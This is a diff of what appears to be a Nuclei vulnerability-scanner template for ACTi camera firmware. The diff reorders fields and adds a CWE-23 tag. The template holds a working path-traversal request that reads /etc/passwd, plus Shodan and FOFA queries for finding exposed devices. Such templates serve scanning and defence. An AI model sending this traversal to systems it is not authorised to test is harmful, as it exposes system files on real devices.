@@ -1,5 +1,4 @@
 id: acti-video-lfi
-
 info:
   name: ACTi-Video Monitoring - Local File Inclusion
   author: DhiyaneshDk
@@ -9,34 +8,31 @@ info:
   reference:
     - https://www.cnblogs.com/hmesed/p/16292252.html
   classification:
+    cwe-id:
+      - CWE-23
     cpe: cpe:2.3:o:acti:camera_firmware:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    fofa-query: app="ACTi-视频监控"
     max-request: 1
-    vendor: acti
     product: camera_firmware
     shodan-query: title:"Web Configurator"
-    fofa-query: app="ACTi-视频监控"
-  tags: acti,lfi,iot,video,monitoring,vuln
-
+    vendor: acti
+    verified: true
+  tags: acti,iot,lfi,monitoring,video,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/images/../../../../../../../../etc/passwd"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body
+  - matchers:
+      - part: body
         regex:
-          - "root:.*:0:0:"
-
-      - type: word
-        part: header
+          - 'root:.*:0:0:'
+        type: regex
+      - part: header
+        type: word
         words:
-          - "application/octet-stream"
-
-      - type: status
-        status:
+          - application/octet-stream
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/images/../../../../../../../../etc/passwd'
